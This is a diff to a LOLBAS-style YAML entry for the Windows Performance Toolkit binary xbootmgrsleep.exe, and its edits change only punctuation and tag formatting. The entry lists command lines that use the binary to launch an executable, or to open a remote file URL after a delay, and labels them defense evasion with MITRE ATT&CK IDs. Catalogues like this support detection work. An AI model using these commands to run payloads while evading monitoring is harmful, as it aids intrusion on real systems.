@@ -6,40 +6,40 @@ Created: 2024-06-13
 Commands:
   - Command: xbootmgrsleep.exe 1000 calc.exe
     Description: Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay.
-    Usecase: Performs execution of specified executable, can be used as a defense evasion.
+    Usecase: Performs execution of specified executable, can be used as a defense evasion
     Category: Execute
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows
     Tags:
-      - Execute:EXE
+      - Execute: EXE
   - Command: xbootmgrsleep.exe "{ANY_STRING}" calc.exe
     Description: Execute executable via XBootMgrSleep.
-    Usecase: Performs execution of specified executable, can be used as a defense evasion.
+    Usecase: Performs execution of specified executable, can be used as a defense evasion
     Category: Execute
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows
     Tags:
-      - Execute:EXE
+      - Execute: EXE
   - Command: xbootmgrsleep.exe 1000 https://www.example.org/file.exe
     Description: Opens the specified URL in the default browser with XBootMgrSleep, with a 1 second (=1000 milliseconds) delay.
-    Usecase: Can be used to execute remote content via the browser, potentially bypassing detection mechanisms.
+    Usecase: Can be used to execute remote content via the browser, potentially bypassing detection mechanisms
     Category: Execute
     Privileges: User
     MitreID: T1204.001
     OperatingSystem: Windows
     Tags:
-      - Execute:URL
+      - Execute: URL
   - Command: xbootmgrsleep.exe "{ANY_STRING}" https://www.example.org/file.exe
     Description: Opens the specified URL in the default browser with XBootMgrSleep.
-    Usecase: Can be used to initiate execution of remote content via default protocol handling, potentially bypassing detection mechanisms.
+    Usecase: Can be used to initiate execution of remote content via default protocol handling, potentially bypassing detection mechanisms
     Category: Execute
     Privileges: User
     MitreID: T1204.001
     OperatingSystem: Windows
     Tags:
-      - Execute:URL
+      - Execute: URL
 Full_Path:
   - Path: C:\Program Files\Windows Kits\10\Windows Performance Toolkit\xbootmgrsleep.exe
   - Path: C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\xbootmgrsleep.exe
